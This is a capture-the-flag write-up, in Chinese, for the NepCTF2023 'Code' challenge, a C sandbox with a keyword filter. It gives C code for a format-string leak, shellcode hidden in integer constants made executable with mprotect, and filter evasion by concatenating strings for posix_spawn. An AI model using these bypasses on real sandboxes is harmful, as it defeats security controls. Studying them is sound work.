NepCTF2023 Code

```c
#include <stdio.h>

int main() {
    char buf[0x8];
    printf("%53$s");
}
```

### 1.初步尝试：shellcode

在得知sys，env，open，read，write都被过滤之后，作为一个pwn手首先想到了就是使用shellcode。发现\x也被过滤，转而写了个可打印字符串的shellcode，然后又发现不如直接用整数冒充shellcode。

```c
#include <stdio.h>
#include <stdlib.h>
int main() {
    // 声明一个函数指针
    void (*func_ptr)();
        long long int values[] = {
        0x006362616858556a,
        0x5e000001ff685f54,
        0x6858016a5f50050f,
        0xe3c1485b766e652f,
        0x03486e69622f6820,
        0x6a5e5453006a241c,
        0x00000000050f5a08
    };
    func_ptr = (void (*)()) values;
    long long int a = values;
    a = a & 0xfffffffff000;
    mprotect(a, 0x1000, 7);
    // 调用函数指针，执行跳转到字符串
   func_ptr();
 
    return 0;
}
```

很帅吧，可惜我没想到出题人这么阴，mprotect也禁了……想尝试写一个/bin/env的sh文件，然后再命令/bin/sh 执行他。也不行捏。

### 2.字符串拼接posix_spawn

可以执行任意命令，但是env命令没有回显，白给。
并且尝试了子进程创建等等方式，无果。

```c
#include <stdio.h>
#include <string.h>
#include <spawn.h>
 
 
int main() {
    pid_t child_pid;
    char path[100] = "/bin/l"; // 初始路径
    strcat(path, "s"); // 
 
    char *const argv[] = { path, "-l","/dev", NULL }; // 命令行参数，包括路径和命令参数
 
    int result = posix_spawn(&child_pid, path, NULL, NULL, argv, NULL);
    if (result == 0) {
        // 等待子进程结束
        waitpid(child_pid, NULL, 0);
    } else {
        // 错误处理
        perror("posix_spawn");
    }
 
    return 0;
}
```

### 3.惊人的答案

打印虚空变量即可。

```c
#include <stdio.h>
 
int main(int argc, char *argv[], char *e[]) {
    for (int i = 0; e[i] != NULL; i++) {
        printf("%s\n", e[i]);
    }
 
    return 0;
}
```

